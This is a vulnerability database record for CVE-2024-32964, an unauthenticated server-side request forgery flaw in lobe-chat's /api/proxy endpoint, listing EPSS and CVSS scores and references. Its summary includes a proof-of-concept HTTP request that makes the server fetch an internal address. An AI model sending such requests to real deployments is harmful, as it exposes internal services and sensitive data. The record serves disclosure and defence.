vulnerability_id: VCID-um5y-c5bu-aaas
aliases:
  - CVE-2024-32964
  - GHSA-mxhq-xw3g-rphc
summary: "lobe-chat `/api/proxy` endpoint Server-Side Request Forgery vulnerability\n### Summary\n\
  The latest version of lobe-chat(by now v0.141.2) has an unauthorized ssrf vulnerability. An\
  \ attacker can construct malicious requests to cause SSRF without logging in, attack intranet\
  \ services, and leak sensitive information.\n\n### Details\n* visit https://chat-preview.lobehub.com/settings/agent\
  \  \n* you can attack all internal services by /api/proxy and get the echo in http response\
  \ :) \n\n![image](https://github.com/lobehub/lobe-chat/assets/55245002/c2894c34-7333-4ae1-864c-3b212b95eb21)\n\
  \n![image](https://github.com/lobehub/lobe-chat/assets/55245002/dd9ad696-7180-4700-8bff-1171a6a8ac91)\n\
  \n![image](https://github.com/lobehub/lobe-chat/assets/55245002/e2b97520-a6d5-4939-8313-46db8a1c4b75)\n\
  \n\n\n### PoC\n```http\nPOST /api/proxy HTTP/2\nHost: xxxxxxxxxxxxxxxxx\nCookie: LOBE_LOCALE=zh-CN;\
  \ LOBE_THEME_PRIMARY_COLOR=undefined; LOBE_THEME_NEUTRAL_COLOR=undefined; _ga=GA1.1.86608329.1711346216;\
  \ _ga_63LP1TV70T=GS1.1.1711346215.1.1.1711346846.0.0.0\nContent-Length: 23\nSec-Ch-Ua: \"\
  Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"\nSec-Ch-Ua-Platform:\
  \ \"Windows\"\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
  \ AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\nContent-Type: text/plain;charset=UTF-8\n\
  Accept: */*\nOrigin: https://chat-preview.lobehub.com\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode:\
  \ cors\nSec-Fetch-Dest: empty\nReferer: https://chat-preview.lobehub.com/settings/agent\n\
  Accept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7\n\n\
  http://172.23.0.1:8000/\n```\n\n### Impact\nSSRF ,All users will be impacted."
severities:
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20208'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20277'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20376'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20283'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20275'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20257'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.20586'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19345'
    published_at: '2024-11-01 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19624'
    published_at: '2024-11-18 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19728'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19764'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19844'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19840'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19854'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19886'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.00049'
    scoring_system: epss
    scoring_elements: '0.19924'
    published_at: '2024-12-03 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.91407'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.91408'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.9141'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.91393'
    published_at: '2025-04-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.91403'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.91412'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.91415'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.91413'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.07696'
    scoring_system: epss
    scoring_elements: '0.91421'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.08482'
    scoring_system: epss
    scoring_elements: '0.9185'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.08482'
    scoring_system: epss
    scoring_elements: '0.91847'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.08482'
    scoring_system: epss
    scoring_elements: '0.91848'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.933'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.9328'
    published_at: '2025-03-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93279'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93295'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93292'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93298'
    published_at: '2025-04-05 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93294'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93293'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93299'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93302'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.1239'
    scoring_system: epss
    scoring_elements: '0.93301'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: '0.54582'
    scoring_system: epss
    scoring_elements: '0.97141'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
  - score: CRITICAL
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-mxhq-xw3g-rphc
  - score: '9.0'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:H
    published_at: None
    url: https://github.com/lobehub/lobe-chat
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/lobehub/lobe-chat
  - score: '9.0'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:H
    published_at: None
    url: https://github.com/lobehub/lobe-chat/commit/465665a735556669ee30446c7ea9049a20cc7c37
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/lobehub/lobe-chat/commit/465665a735556669ee30446c7ea9049a20cc7c37
  - score: '9.0'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:H
    published_at: None
    url: https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc
weaknesses:
  - CWE-918
  - CWE-937
  - CWE-1035
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-32964
    reference_type:
    reference_id:
  - url: https://github.com/lobehub/lobe-chat
    reference_type:
    reference_id:
  - url: https://github.com/lobehub/lobe-chat/commit/465665a735556669ee30446c7ea9049a20cc7c37
    reference_type:
    reference_id:
  - url: https://github.com/lobehub/lobe-chat/security/advisories/GHSA-mxhq-xw3g-rphc
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-32964
    reference_type:
    reference_id: CVE-2024-32964
  - url: https://github.com/advisories/GHSA-mxhq-xw3g-rphc
    reference_type:
    reference_id: GHSA-mxhq-xw3g-rphc
